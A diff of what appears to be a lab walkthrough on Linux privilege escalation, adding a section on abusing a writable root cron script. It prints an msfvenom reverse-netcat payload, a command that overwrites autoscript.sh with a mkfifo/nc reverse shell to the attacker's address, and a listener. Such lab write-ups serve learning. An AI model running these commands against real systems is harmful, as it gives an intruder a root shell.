@@ -190,7 +190,7 @@ openssl passwd -1 -salt new 123
 >
 >openssl passwd computes the hash of the password that we provide to it.
 >
->`-salt` is used to provide a salt, which is a peice of data that will be taken into account when computing the hash.
+>`-salt` is used to provide a salt, which is a piece of data that will be taken into account when computing the hash.
 >
 >Salts are really useful because the same string always generates the same hash, but with different salts, we can obtain different hashes for two identical passwords.
 
@@ -247,6 +247,80 @@ sudo vi
 >once inside `vi`, we can spawn the shell and it will be run as root
 
 ## Task 8 : Exploiting crontab
+
+As mentioned at the beginning, `cron` is a daemon (background process) that automates tasks. By looking at `/etc/crontab`, we can see which tasks are scheduled and research for anything of interest.
+
+Thanks to the `LinEnum`scan, we found that there is a script called `autoscript.sh` that is set to run as root every 5 minutes and it has writing permissions.
+
+<span class="pink">What is a payload?</span>
+
+A payload is the piece of code that we want the target to run, there are multiples tpyes of payloads, which you can learn about [in here](https://www.offensive-security.com/metasploit-unleashed/payloads/)
+
+The path to scalating privileges here is to craft a payload that gets us a reverse shell (which will have root privileges because the script runs as root) and modify the script by inserting this payload in it.
+
+We will need to create a payload in order to insert it in the script, and the tool we're using is called `msfvenom`, it is a really complete and complex tool, and you can learn more about it [here](https://www.hackingarticles.in/msfvenom-tutorials-beginners/)
+
+<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/msfvenom%20man8.png" class="border" />
+
+```
+msfvenom man | grep payload
+```
+
+>Trying to find which option allows us to specify a payload
+
+* * *
+<span class="answer">Answer : -p</span>
+* * *
+
+<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/msfvenom%20payload8.png" class="border" />
+
+```
+msfvenom -p cmd/unix/reverse_netcat lhost=<YOUR MACHINE'S @IP> lport=8888 R
+```
+
+> We create the payload for a reverse shell and we want it to connect to port 8888.
+
+If we don't remember where the script is, we can just look for it :
+
+<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/find%20autoscript8.png" class="border" />
+
+```
+find / -name autoscript.sh 2>/dev/null
+```
+
+>Once again showing how useful `find` is, now with the `-name` switch, which lets us search a file by its name.
+
+We know where the script is now, so we need to rewrite its content with our payload :
+
+<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/write%20payload%20in%20autoscript8.png" class="border" />
+
+```
+echo mkfifo /tmp/zxfbetj; nc <YOUR MACHINE'S @IP> 8888 0</tmp/zxfbetj | /bin/sh >/tmp/zxfbetj 2>&1; rm /tmp/zxfbetj > autoscript.sh
+```
+
+>Notice that we use the `>` operator, because this time we do want to rewrite the file.
+
+What `autoscript.sh` now does, is generating a shell with root privileges in the @IP that we specified, and this script is run every 5 minutes, so now we will start a listener in our local machine and wait for the shell to spawn! 
+
+<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/root8.png" class="border" />
+
+```
+nc -lvp 8888
+```
+>`nc` is a pretty simple tool that is used to exchange data in the network.
+>
+>`-lvp` is a combination of the options `-l`, used to start a listener server, `-v`, used to increment the verbose of the output and `-p`, which lets us select the port that we want to open.
+>
+>After waiting for a maximum of 5 minutes, the shell should spawn.
+
+## Task 9 : Exploiting PATH Variable
+
+
+
+
+
+
+
 
 <style>
   .border {   
